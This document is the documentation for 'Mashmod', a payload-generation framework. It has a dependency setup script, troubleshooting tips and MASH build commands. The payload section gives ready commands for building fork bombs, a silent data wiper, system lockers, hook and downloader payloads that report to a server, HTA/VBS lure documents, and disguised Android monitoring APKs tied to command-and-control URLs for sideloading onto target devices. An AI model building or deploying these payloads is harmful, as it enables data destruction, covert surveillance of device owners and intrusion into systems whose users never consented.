Introduction

Advanced Penetration Testing & Payload Generation Tool

Mashmod is a comprehensive penetration testing framework designed for security professionals and researchers conducting authorized security assessments. It provides a powerful suite of tools for crafting custom payloads, conducting reconnaissance, and testing security controls across multiple platforms and protocols.

Built with flexibility and extensibility in mind, Mashmod supports payload generation for both desktop and mobile environments, with specialized modules for wireless protocol testing including Bluetooth and WiFi reconnaissance capabilities. The framework leverages cross-platform compilation to generate executable payloads for Windows and Linux from a single development environment.

The modular architecture allows security researchers to quickly prototype and deploy custom testing scenarios while maintaining a consistent workflow across different target platforms and architectures.

Setup & Installation

Setup & Installation Options

Installation Guide

Initial configuration and dependency installation

Before using Mashmod, you must run the automated setup script to install all required dependencies. The script handles the installation and configuration of Java Development Kit 17, Android SDK and command-line tools, Gradle build system, native compilation tools, MinGW cross-compiler for Windows targets, and OpenSSL libraries for both Linux and Windows.

Installation Steps

1
Make the setup script executable
chmod +x java_setup.sh
2
Execute the setup script with elevated privileges
sudo ./java_setup.sh
3
Wait for installation to complete

The script will automatically download and configure all dependencies. This process typically takes 10-20 minutes depending on your internet connection speed and system performance.

4
Reload shell configuration
source ~/.zshrc
# or for bash users:
source ~/.bashrc

Setup Script Operations

The setup script performs the following operations in sequence:

  • Verifies existing Java installation and version compatibility
  • Downloads and installs OpenLogic OpenJDK 17 if needed
  • Configures Java alternatives to set JDK 17 as default
  • Installs Gradle build automation tool
  • Configures Gradle wrapper with version 8.11.1 for Android builds
  • Downloads and extracts Android command-line tools
  • Configures Android SDK environment variables
  • Accepts all required Android SDK licenses
  • Updates project configuration with correct SDK paths
  • Installs native compilation libraries (pthread, X11, Xtst)
  • Installs MinGW-w64 cross-compiler toolchain
  • Downloads and compiles OpenSSL for MinGW targets
  • Performs initial Gradle build of Android components

Setup Script Reference

Complete setup script contents and explanation

The complete setup script contents:

#!/bin/bash
set -e
JAVA_COMMAND= java -version
# Check if Java is installed and version is 17
if command -v java >/dev/null 2>&1; then
JAVA_VER=$(java -version 2>&1 | awk -F '"' '/version/ {print $2}' | cut -d. -f1)
if [ "$JAVA_VER" = "17" ]; then
echo "JDK 17 already installed."
java -version
exit 0
fi
fi
echo "Installing OpenLogic OpenJDK 17..."
#update package list and install JDK17
sudo apt update
wget https://builds.openlogic.com/downloadJDK/openlogic-openjdk/17.0.16+8/openlogic-openjdk-17.0.16+8-linux-x64-deb.deb
sudo apt install ./openlogic-openjdk-17.0.16+8-linux-x64-deb.deb
sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/openlogic-openjdk-17-hotspot-amd64/bin/java 1
sudo update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/openlogic-openjdk-17-hotspot-amd64/bin/javac 1
# Set OpenLogic JDK 17 as the default
sudo update-alternatives --set java /usr/lib/jvm/openlogic-openjdk-17-hotspot-amd64/bin/java
sudo update-alternatives --set javac /usr/lib/jvm/openlogic-openjdk-17-hotspot-amd64/bin/javac
#check to verify java setup
java -version
javac -version
#GRADLE INSTALLATION SEETUP
sudo apt install gradle
gradle -v
cd android16
gradle wrapper --gradle-version 8.11.1
chmod +x gradlew
cd
mkdir -p ~/Android/Sdk
wget https://dl.google.com/android/repository/commandlinetools-linux-13114758_latest.zip
unzip commandlinetools-linux-13114758_latest.zip -d ~/Android/Sdk/
mkdir -p ~/Android/Sdk/cmdline-tools/latest
mv ~/Android/Sdk/cmdline-tools/* ~/Android/Sdk/cmdline-tools/latest/
echo 'export ANDROID_HOME=$HOME/Android/Sdk' >> ~/.zshrc
echo 'export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools' >> ~/.zshrc
source ~/.zshrc
echo "Accept all Android Licenses"
yes | sdkmanager --licenses
cd MASHMOD/android16
sed -i "s|/home/[^/]*/Android/Sdk|/home/$(whoami)/Android/Sdk|" local.properties
./gradlew clean
./gradlew build
#C setup and installation
sudo apt-get install libpthread-stubs0-dev libx11-dev libxtst-dev
sudo apt-get install mingw-w64 gcc-mingw-w64 g++-mingw-w64
x86_64-w64-mingw32-gcc --version
exit
#build command for linux
gcc THEHITMAN/pentool.c -o pentool -lpthread -lX11 -lXtst -I/usr/include/X11
#build command for windows on liinux
x86_64-w64-mingw32-gcc THEHITMAN/pentoolwin32.c -o pentool.exe -lws2_32 -liphlpapi -lgdi32 -lpthread -mwindows
#openssl for mingw
# Download precompiled OpenSSL for mingw-w64
wget https://github.com/openssl/openssl/releases/download/openssl-3.0.7/openssl-3.0.7.tar.gz
tar -xzf openssl-3.0.7.tar.gz
cd openssl-3.0.7
# Configure for mingw-w64
./Configure mingw64 --cross-compile-prefix=x86_64-w64-mingw32- --prefix=/usr/x86_64-w64-mingw32
make
sudo make install
Important

If you are using bash instead of zsh, you will need to manually add the Android SDK environment variables to your ~/.bashrc file instead of ~/.zshrc.

Building Payloads

Payload Building Options

Building Desktop Payloads

Creating payloads for Windows and Linux systems

MASHMOD simplifies the process of building desktop payloads for both Windows and Linux systems. Using the MASH command, you can quickly generate payloads with various configurations.

BULL-DozzeR Payloads

BULL-DozzeR payloads are designed for system disruption and testing. They can be configured for different behaviors.

Example Commands

# Build an annoying payload for Windows
MASH -b -t annoying -w -n myannoying -i icon.png

# Build a forkbomb payload for Linux
MASH -b -t forkbomb -l -n forkbomb_linux

# Build a silent wipe payload for Windows with custom icon
MASH -b -t silentwipe -w -n data_wiper -i custom_icon.ico

PC Payloads

PC payloads offer more advanced functionality with various source files to choose from, each providing different capabilities.

Example Commands

# Build a hook payload for Windows with server configuration
MASH -p -s hook.c -w --server-ip 192.168.1.100 --server-port 8080 -n myhook

# Build a webview payload for Linux with remote server
MASH -p -s webview_pen.cpp -l --remote-server-url https://example.com --remote-server-port 443 -n webview_linux

# Build a download payload for Windows
MASH -p -s download.cpp -w -n downloader -i download_icon.ico

# Build a system lock payload for Linux
MASH -p -s syslock.cpp -l -n syslock_linux

Cross-Platform Payloads

Cross-platform payloads work on multiple operating systems with a single build command.

Example Command

# Build an HTTPS capture payload
MASH -x -t https-capture

Document Payloads

Document payloads are embedded in common file formats for social engineering scenarios.

Example Commands

# Build an HTA payload
MASH -o -t hta

# Build a VBS payload
MASH -o -t vbs
Desktop Payload Building Process
Note

All payloads are built in the current working directory. Ensure you have the necessary permissions to write files in that location.

Building Android Payloads

Creating payloads for Android devices

MASHMOD supports building Android payloads with various functionalities. These payloads are packaged as APK files that can be installed on Android devices.

Android Payload Types

MASHMOD offers several Android payload types, each designed for specific testing scenarios:

  • Monitor: Basic monitoring payload with main and streaming server URLs
  • Monitor2: Enhanced monitoring with additional features
  • Monitor3: Advanced monitoring with extended capabilities
  • HTTPSProxy: Proxy payload for intercepting HTTPS traffic

Example Commands

# Build a Monitor payload with custom app name
MASH -a -t Monitor --main-url wss://example.com --stream-url wss://stream.example.com --app-name MyApp --app-icon icon.png

# Build a Monitor2 payload
MASH -a -t Monitor2 --main-url wss://monitor.example.com --stream-url wss://stream.example.com --app-name SecureMonitor

# Build an HTTPSProxy payload
MASH -a -t HTTPSProxy --server-url https://proxy.example.com --target-website https://target.com --app-name WebProxy

Customization Options

Android payloads can be customized with various options:

  • App Name: The name that appears on the device after installation
  • App Icon: Custom icon for the application
  • Server URLs: Configuration for communication with command and control servers
  • Target Website: For HTTPSProxy payloads, the target website to proxy

Output

After building, the APK file will be saved in the current working directory. You can then transfer it to the target device for installation.

Android Payload Building Process
Important

Android payloads require the "Unknown Sources" option to be enabled on the target device for installation. This option is typically found in Security settings.

Troubleshooting

Common issues and solutions

Java Version Conflicts

If you have multiple Java versions installed on your system, JDK 17 must be set as the default for Gradle builds to function correctly. 

sudo update-alternatives --config java
sudo update-alternatives --config javac

Select the OpenJDK 17 option from the interactive menu.

Android SDK Path Issues

The setup script configures environment variables for zsh. If you use bash, manually add the exports: 

echo 'export ANDROID_HOME=$HOME/Android/Sdk' >> ~/.bashrc
echo 'export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools' >> ~/.bashrc
source ~/.bashrc

Gradle Build Failures

Ensure the local.properties file in the android16 directory contains the correct Android SDK path: 

sdk.dir=/home/YOUR_USERNAME/Android/Sdk

Replace YOUR_USERNAME with your actual username or run the setup script again to auto-configure.

MinGW Compilation Errors

Verify MinGW is properly installed and accessible: 

x86_64-w64-mingw32-gcc --version

If the command is not found, reinstall MinGW:

sudo apt-get install mingw-w64 gcc-mingw-w64 g++-mingw-w64

Android Build Dependency Issues

If Android builds fail due to missing SDK components, install required packages manually: 

sdkmanager "platform-tools" "platforms;android-35" "build-tools;35.0.0"
sdkmanager "ndk;27.0.12077973"

Permission Denied Errors

If you encounter permission errors when running gradlew: 

chmod +x android16/gradlew

Out of Memory During Compilation

For systems with limited RAM, increase Gradle heap size by creating or editing gradle.properties: 

org.gradle.jvmargs=-Xmx2048m -XX:MaxMetaspaceSize=512m

OpenSSL Compilation Issues

If OpenSSL compilation for MinGW fails, ensure all prerequisites are installed: 

sudo apt-get install build-essential perl

Network Connection Issues During Setup

If downloads fail during setup, verify your internet connection and proxy settings. You may need to configure apt and wget to use your proxy: 

export http_proxy=http://proxy.example.com:port
export https_proxy=http://proxy.example.com:port
Additional Support

When reporting issues, include your system information, error messages, and the exact commands that produced the error. Check that all prerequisites are installed and environment variables are correctly configured.
